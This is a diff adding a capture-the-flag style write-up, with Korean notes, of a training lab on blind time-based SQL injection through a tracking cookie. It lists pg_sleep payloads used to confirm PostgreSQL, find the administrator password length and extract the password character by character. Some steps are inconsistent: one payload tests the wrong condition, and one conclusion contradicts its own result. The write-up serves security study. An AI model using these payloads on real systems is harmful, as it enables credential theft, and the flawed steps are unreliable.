@@ -1,0 +1,28 @@
+#Lab: Blind SQL injection with time delays and information retrieval
+
+This lab contains a blind SQL injection vulnerability. 
+The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
+The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error.
+However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.
+The database contains a different table called users, with columns called username and password. 
+You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
+To solve the lab, log in as the administrator user.
+
+### 🔍 분석 및 공격 과정
+0. DB 종류에 따른 여러가지 delay 함수를 넣어보며 DB종류 파악. -> pg_sleep() 작동.
+>>> TrackingId=3xi1poxwtd1eM4ON'%3BSELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- 
+1. username이 administrator인 데이터가 있는지 체크
+>>> TrackingId=3xi1poxwtd1eM4ON'%3BSELECT CASE WHEN (username='password') THEN pg_sleep(10) ELSE pg_sleep(0) END from users--
+ --> 시간지연 발생 -> 존재.
+2. administrator의 password 길이 체크.
+>>> TrackingId=3xi1poxwtd1eM4ON'%3BSELECT CASE WHEN (LENGTH(password) > 10) THEN pg_sleep(10) ELSE pg_sleep(0) END from users where username ='administrator'--
+ --> 시간지연 발생 -> 10글자 이상.
+>>> TrackingId=3xi1poxwtd1eM4ON'%3BSELECT CASE WHEN (LENGTH(password) > 20) THEN pg_sleep(10) ELSE pg_sleep(0) END from users where username ='administrator'--
+ --> 시간지연 발생 -> 20글자 이하.
+>>> TrackingId=3xi1poxwtd1eM4ON'%3BSELECT CASE WHEN (LENGTH(password) = 20) THEN pg_sleep(10) ELSE pg_sleep(0) END from users where username ='administrator'--
+ --> 시간지연 발생 -> password가 20글자임.
+3. 이제 password를 한글자 한글자 추론해보자.
+ 수 많은 페이로드를 보내야하기에 intruder clustorbomb를 사용함. 단, concurrent request를 1로 바꿔야함.
+왜냐하면 한번에 여러 요청을 동시에 보내게 되면 대기시간의 일관성이 없어지기에, 지연시간이 pg_sleep으로 인한것인지 아니면 단순히 응답을 대기하느라 생긴것인지 헷리기에.
+이제 공격실시 결과에서 Response received 컬럼을 내림차순 기준으로 정렬해 10초이상 걸린걸 나열하면 비밀번호를 구할 수 있음.4
+구한 password = x8n8hywtjh04clxnq4h3 -> solve!!!
